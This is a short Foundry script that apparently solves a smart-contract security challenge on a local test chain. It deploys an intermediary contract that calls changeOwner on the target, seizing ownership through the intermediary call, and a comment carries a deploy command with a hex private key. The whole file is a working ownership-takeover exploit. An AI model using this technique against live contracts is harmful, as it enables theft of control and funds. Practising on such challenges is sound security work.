// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract Loader {
    function claim(address target, address user) public {
        ITarget(target).changeOwner(user);
    }
}
contract SolveScript is Script {
    address public target = 0x553BED26A78b94862e53945941e4ad6E4F2497da;

    function setUp() public {}

    // user - 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("owner : %s", ITarget(target).owner());
        Loader loader = new Loader();
        loader.claim(target, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC);
        console.log("owner : %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}
